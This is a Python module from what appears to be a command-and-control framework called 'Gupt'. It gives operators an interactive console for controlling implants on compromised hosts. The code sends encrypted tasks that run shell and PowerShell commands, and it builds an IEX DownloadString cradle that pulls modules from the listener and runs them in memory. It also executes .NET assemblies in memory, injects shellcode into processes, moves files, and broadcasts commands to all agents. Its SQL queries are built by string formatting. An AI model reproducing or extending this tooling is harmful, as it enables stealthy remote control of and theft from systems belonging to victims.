"""
Enhanced interact functions with multi-agent support and in-memory execution
"""
from tabulate import tabulate
from time import sleep
import sqlite3
import os
import base64
import threading
from Core import encryption, color, database, helper
from Core.agentmanager import agent_manager


def result_callback(name, result):
    """Callback triggered when a result arrives from an agent"""
    print("\n[%s] Result from %s:\n%s" % (color.green("+"), color.cyan(name), result))


def send_task(name, key, command, use_memory=True):
    """Send task to agent via in-memory queue AND file (for reliability)"""
    enc_command = encryption.EncryptString(command, key)
    
    # Always write to file as backup
    os.makedirs("data/implant/%s" % name, exist_ok=True)
    with open("data/implant/%s/tasks.enc" % name, "w") as f:
        f.write(enc_command)
    
    # Also queue in memory if agent is registered
    if use_memory:
        agent_manager.queue_task(name, enc_command)
    
    print("[%s] Task queued for %s" % (color.green("+"), name))
    return True


def wait_for_result(name, timeout=30):
    """Wait for result from agent with timeout"""
    import time as time_module
    start = time_module.time()
    
    while time_module.time() - start < timeout:
        result = agent_manager.get_result(name, timeout=1)
        if result:
            return result.get('result')
        sleep(0.5)
    
    return None


def interact(conn, command):
    """Main interact function - supports multi-agent concurrent sessions"""
    name = command.split()[1]
    key_result = database.return_key(conn, name)
    
    if not key_result:
        print("[%s] Agent %s not found!" % (color.red("-"), name))
        return
    
    key = key_result[0][0]
    
    # Ensure agent is registered in memory manager
    results = conn.execute("SELECT Listener_IP, Listener_Port, Listener_Name FROM Implant_Info WHERE Implant_Name='%s'" % name).fetchall()
    if results:
        agent_manager.register_agent(name, key, results[0][2], results[0][0], results[0][1])
    
    print("[%s] Interacting with agent %s" % (color.green("+"), color.cyan(name)))
    print("[%s] Type 'help' for available commands\n" % (color.blue("*")))
    
    while True:
        try:
            interact_command = input("[%s%s%s]%s[%s%s%s]%s " % (
                color.red("Gupt"), color.yellow("@"), color.cyan("C2"), color.yellow("-->"),
                color.red("Agent"), color.yellow(":"), color.cyan(name), color.yellow("::>")
            )).strip()
            
            if not interact_command:
                continue
            
            # Basic shell commands
            if interact_command[:10] == "powershell" or interact_command[:3] == "cmd":
                print("[%s] Executing: %s" % (color.cyan("*"), interact_command))
                send_task(name, key, interact_command)
            
            # Exit/kill agent
            elif interact_command == "exit" or interact_command == "kill":
                ask = input("[%s] Are you sure you want to terminate the agent? (Y/N): " % color.cyan("*"))
                if ask.lower() == "y":
                    print("[%s] Sending exit command..." % color.green("+"))
                    send_task(name, key, "exit")
                    return True
            
            # Help menu
            elif interact_command == "help":
                print("\n%s\n" % helper.help_interact2())
            
            # Back to main menu
            elif interact_command == "back":
                return True
            
            # Sleep/delay
            elif interact_command[:5] == "sleep":
                print("[%s] Changing sleep interval" % color.green("+"))
                send_task(name, key, interact_command)
            
            # List available modules
            elif interact_command == "list module" or interact_command == "modules":
                results = database.list_module(conn)
                if results:
                    data = [[results[i][0], results[i][1]] for i in range(len(results))]
                    print("\n", tabulate(data, headers=["Module", "Description"]), "\n")
                else:
                    print("[%s] No modules found" % color.yellow("!"))
            
            # Load and execute PowerShell module
            elif interact_command[:6] == "module":
                execute_module(conn, name, key, interact_command)
            
            # ========== NEW IN-MEMORY EXECUTION COMMANDS ==========
            
            # Execute .NET assembly in-memory
            elif interact_command[:16] == "execute-assembly":
                execute_assembly(conn, name, key, interact_command)
            
            # Inline PowerShell execution (no process creation)
            elif interact_command[:6] == "inline":
                script = interact_command[7:].strip()
                print("[%s] Executing inline PowerShell..." % color.cyan("*"))
                send_task(name, key, "inline " + script)
            
            # Load PowerShell script into memory and execute
            elif interact_command[:10] == "powerpick " or interact_command[:10] == "powershell":
                if interact_command[:10] == "powerpick ":
                    script = interact_command[10:].strip()
                    print("[%s] Executing via PowerPick (no powershell.exe)..." % color.cyan("*"))
                    send_task(name, key, "powerpick " + script)
            
            # Shellcode injection
            elif interact_command[:8] == "shinject":
                shellcode_inject(conn, name, key, interact_command)
            
            # Download file from target
            elif interact_command[:8] == "download":
                filepath = interact_command[9:].strip()
                print("[%s] Downloading: %s" % (color.cyan("*"), filepath))
                send_task(name, key, "download " + filepath)
            
            # Upload file to target
            elif interact_command[:6] == "upload":
                upload_file(conn, name, key, interact_command)
            
            # Execute raw shellcode
            elif interact_command[:9] == "shellcode":
                execute_shellcode(conn, name, key, interact_command)
            
            # Spawn new process and inject
            elif interact_command[:5] == "spawn":
                process = interact_command[6:].strip() if len(interact_command) > 6 else "notepad.exe"
                print("[%s] Spawning process: %s" % (color.cyan("*"), process))
                send_task(name, key, "spawn " + process)
            
            # Process injection
            elif interact_command[:6] == "inject":
                inject_process(conn, name, key, interact_command)
            
            # Get agent/implant info
            elif interact_command == "info" or interact_command == "sysinfo":
                print("[%s] Gathering system info..." % color.cyan("*"))
                send_task(name, key, "sysinfo")
            
            # List processes
            elif interact_command == "ps" or interact_command == "processes":
                print("[%s] Listing processes..." % color.cyan("*"))
                send_task(name, key, "ps")
            
            # Get agent status
            elif interact_command == "status":
                agent = agent_manager.get_agent(name)
                if agent:
                    status = agent.get_status()
                    print("\n[%s] Agent Status:" % color.cyan("*"))
                    for k, v in status.items():
                        print("    %s: %s" % (color.yellow(k), v))
                    print()
                    
            # Clear task queue
            elif interact_command == "clear":
                agent = agent_manager.get_agent(name)
                if agent:
                    while not agent.task_queue.empty():
                        agent.task_queue.get_nowait()
                    print("[%s] Task queue cleared" % color.green("+"))
            
            # Check for pending results
            elif interact_command == "results" or interact_command == "getresult":
                result = agent_manager.get_result(name, timeout=0.1)
                if result:
                    print("\n[%s] Result:\n%s\n" % (color.green("+"), result.get('result', 'No data')))
                else:
                    print("[%s] No pending results" % color.yellow("!"))
            
            else:
                # Default: try to execute as shell command
                if interact_command:
                    print("[%s] Unknown command. Sending as shell command..." % color.yellow("!"))
                    send_task(name, key, "cmd " + interact_command)
        
        except KeyboardInterrupt:
            print("\n[%s] Use 'back' to return to main menu" % color.yellow("!"))
        except Exception as e:
            print("[%s] Error: %s" % (color.red("-"), str(e)))


def execute_module(conn, name, key, interact_command):
    """Load and execute PowerShell module"""
    try:
        invoke_command = input("[%s] Enter the command to invoke::> " % color.cyan("*")).strip()
        module_name = interact_command.split()[1]
        results = database.list_module(conn)
        
        module_path = None
        for mod in results:
            if mod[0] == module_name:
                module_path = mod[2]
                break
        
        if not module_path:
            print("[%s] Module '%s' not found" % (color.red("-"), module_name))
            return
        
        file_content = open(module_path, "r").read()
        
        # Save module for serving (backwards compat)
        os.makedirs("data/implant/%s" % name, exist_ok=True)
        with open("data/implant/%s/host.ps1" % name, "w") as f:
            f.write(file_content)
        
        # Get listener info
        results = conn.execute(
            "SELECT Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name='%s'" % name
        ).fetchall()
        
        if results:
            # Use IEX cradle for in-memory execution
            command = "powershell IEX(New-Object Net.Webclient).DownloadString('http://%s:%s/module/%s');%s" % (
                results[0][0], results[0][1], name, invoke_command
            )
            print("[%s] Loading module: %s" % (color.green("+"), module_name))
            send_task(name, key, command)
    except Exception as e:
        print("[%s] Module execution failed: %s" % (color.red("-"), str(e)))


def execute_assembly(conn, name, key, interact_command):
    """Execute .NET assembly in-memory without touching disk"""
    try:
        parts = interact_command.split()
        if len(parts) < 2:
            print("[%s] Usage: execute-assembly <path_to_assembly> [arguments]" % color.yellow("!"))
            return
        
        assembly_path = parts[1]
        assembly_args = " ".join(parts[2:]) if len(parts) > 2 else ""
        
        if not os.path.exists(assembly_path):
            print("[%s] Assembly file not found: %s" % (color.red("-"), assembly_path))
            return
        
        # Read assembly bytes and base64 encode
        with open(assembly_path, 'rb') as f:
            assembly_bytes = f.read()
        
        assembly_b64 = base64.b64encode(assembly_bytes).decode()
        
        # Get listener info for assembly download URL
        results = conn.execute(
            "SELECT Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name='%s'" % name
        ).fetchall()
        
        if results:
            # Store assembly in memory for agent to download
            agent_manager.set_pending_assembly(name, assembly_bytes)
            
            # Send execute-assembly command
            command = "execute-assembly http://%s:%s/assembly/%s %s" % (
                results[0][0], results[0][1], name, assembly_args
            )
            print("[%s] Executing assembly in-memory: %s" % (color.green("+"), os.path.basename(assembly_path)))
            send_task(name, key, command)
    except Exception as e:
        print("[%s] Assembly execution failed: %s" % (color.red("-"), str(e)))


def shellcode_inject(conn, name, key, interact_command):
    """Inject shellcode into a process"""
    try:
        parts = interact_command.split()
        if len(parts) < 3:
            print("[%s] Usage: shinject <pid> <path_to_shellcode>" % color.yellow("!"))
            return
        
        pid = parts[1]
        shellcode_path = parts[2]
        
        if not os.path.exists(shellcode_path):
            print("[%s] Shellcode file not found: %s" % (color.red("-"), shellcode_path))
            return
        
        with open(shellcode_path, 'rb') as f:
            shellcode_bytes = f.read()
        
        shellcode_b64 = base64.b64encode(shellcode_bytes).decode()
        
        # Get listener info
        results = conn.execute(
            "SELECT Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name='%s'" % name
        ).fetchall()
        
        if results:
            agent_manager.set_pending_shellcode(name, shellcode_bytes)
            command = "shinject %s http://%s:%s/shellcode/%s" % (
                pid, results[0][0], results[0][1], name
            )
            print("[%s] Injecting shellcode into PID %s" % (color.green("+"), pid))
            send_task(name, key, command)
    except Exception as e:
        print("[%s] Shellcode injection failed: %s" % (color.red("-"), str(e)))


def execute_shellcode(conn, name, key, interact_command):
    """Execute raw shellcode in current process"""
    try:
        parts = interact_command.split()
        if len(parts) < 2:
            print("[%s] Usage: shellcode <path_to_shellcode>" % color.yellow("!"))
            return
        
        shellcode_path = parts[1]
        
        if not os.path.exists(shellcode_path):
            print("[%s] Shellcode file not found: %s" % (color.red("-"), shellcode_path))
            return
        
        with open(shellcode_path, 'rb') as f:
            shellcode_bytes = f.read()
        
        shellcode_b64 = base64.b64encode(shellcode_bytes).decode()
        
        command = "shellcode-exec " + shellcode_b64
        print("[%s] Executing shellcode (%d bytes)" % (color.green("+"), len(shellcode_bytes)))
        send_task(name, key, command)
    except Exception as e:
        print("[%s] Shellcode execution failed: %s" % (color.red("-"), str(e)))


def inject_process(conn, name, key, interact_command):
    """Inject into existing process"""
    try:
        parts = interact_command.split()
        if len(parts) < 2:
            print("[%s] Usage: inject <pid>" % color.yellow("!"))
            return
        
        pid = parts[1]
        print("[%s] Injecting into PID %s" % (color.cyan("*"), pid))
        send_task(name, key, "inject " + pid)
    except Exception as e:
        print("[%s] Process injection failed: %s" % (color.red("-"), str(e)))


def upload_file(conn, name, key, interact_command):
    """Upload file to target"""
    try:
        parts = interact_command.split()
        if len(parts) < 3:
            print("[%s] Usage: upload <local_path> <remote_path>" % color.yellow("!"))
            return
        
        local_path = parts[1]
        remote_path = parts[2]
        
        if not os.path.exists(local_path):
            print("[%s] Local file not found: %s" % (color.red("-"), local_path))
            return
        
        with open(local_path, 'rb') as f:
            file_bytes = f.read()
        
        file_b64 = base64.b64encode(file_bytes).decode()
        
        command = "upload %s %s" % (remote_path, file_b64)
        print("[%s] Uploading %s to %s" % (color.green("+"), local_path, remote_path))
        send_task(name, key, command)
    except Exception as e:
        print("[%s] File upload failed: %s" % (color.red("-"), str(e)))


# ========== MULTI-AGENT MANAGEMENT FUNCTIONS ==========

def list_active_agents():
    """List all active agents"""
    agents = agent_manager.get_all_agents()
    if not agents:
        print("[%s] No agents registered" % color.yellow("!"))
        return
    
    data = []
    for agent in agents:
        status = agent.get_status()
        data.append([
            status['name'],
            status['status'],
            status['hostname'] or 'Unknown',
            status['username'] or 'Unknown',
            status['last_seen']
        ])
    
    print("\n", tabulate(data, headers=[
        color.red("Name"), color.red("Status"), color.red("Hostname"),
        color.red("Username"), color.red("Last Seen")
    ], tablefmt="fancy_grid"), "\n")


def broadcast_command(conn, command):
    """Send command to all active agents"""
    agents = agent_manager.get_active_agents()
    if not agents:
        print("[%s] No active agents" % color.yellow("!"))
        return
    
    for agent in agents:
        key_result = database.return_key(conn, agent.name)
        if key_result:
            key = key_result[0][0]
            send_task(agent.name, key, command)
            print("[%s] Task queued for %s" % (color.green("+"), agent.name))
